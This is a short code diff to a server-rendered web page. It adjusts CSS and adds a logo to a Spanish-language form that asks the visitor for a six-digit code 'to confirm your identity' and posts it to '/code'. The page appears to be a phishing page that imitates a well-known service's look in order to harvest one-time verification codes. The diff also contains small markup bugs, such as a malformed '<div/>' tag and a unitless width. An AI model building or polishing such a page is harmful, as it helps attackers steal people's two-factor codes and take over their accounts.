@@ -50,10 +50,10 @@ else if (req.url === '/ok') {
       .wrapper{width:350px}
       .box{
         background:#fff;border:1px solid #dbdbdb;
-        padding:40px 40px 20px;text-align:center;
+        padding:80px 40px 20px;text-align:center;
       }
       .title{font-size:18px;font-weight:600;margin-bottom:12px}
-      .desc{font-size:14px;color:#444;margin-bottom:16px}
+      .desc{font-size:12px;color:#444;margin-bottom:16px}
       .input{
 width: 85%;
 height: 38px;
@@ -73,6 +73,9 @@ text-align: center;
         background:#0095f6;border:none;border-radius:8px;
         color:#fff;font-weight:600;font-size:14px;cursor:pointer;
       }
+      .logo img{  
+      width: 250;
+       }
       .footer{
         margin-top:10px;border:1px solid #dbdbdb;background:#fff;
         padding:20px;text-align:center;font-size:14px;color:#8e8e8e;
@@ -82,6 +85,9 @@ text-align: center;
   <body>
     <div class="wrapper">
       <div class="box">
+      <div class="logo">
+      <img src="logomp1.png">
+      <div/>
         <div class="title">Ingresa el código de 6 digitos.</div>
         <div class="desc">Para confirmar tu identidad ingresá el código que enviamos.</div>
         <form method="POST" action="/code"> 
